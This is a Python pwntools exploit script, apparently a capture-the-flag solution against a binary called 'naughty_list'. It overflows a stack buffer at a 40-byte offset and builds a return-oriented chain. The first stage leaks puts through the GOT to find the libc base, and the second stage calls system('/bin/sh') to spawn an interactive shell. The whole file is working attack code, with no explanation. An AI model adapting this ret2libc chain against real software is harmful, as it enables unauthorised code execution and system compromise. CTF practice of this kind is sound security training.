#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template naughty_list_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('naughty_list')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

get_lines = lambda x: [io.recvline() for _ in range(x)]

io = start()

offset = 40

# binary gadgets
pop_rdi = 0x401443
pop_rsi = 0x401441
add_rsp = 0x400752
ret = 0x400756
# libc gadgets
pop_rdx = 0x1b96

io.sendlineafter(b":", b"michal")
io.sendlineafter(b":", b"whateva")
io.sendlineafter(b":", b"120")

payload = cyclic_gen().get(40)
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.get_descr)

io.sendlineafter(b":", payload)

get_lines(6)

leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"Got leak: {hex(leak)}")
libc.address = leak - libc.sym.puts
assert libc.address & 0x111 == 0x0
log.success(f"Got libc base address: {hex(libc.address)}")

payload = cyclic_gen().get(40)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
# stack alignment
payload += p64(ret)
payload += p64(libc.sym.system)

io.sendlineafter(b":", payload)

io.interactive()

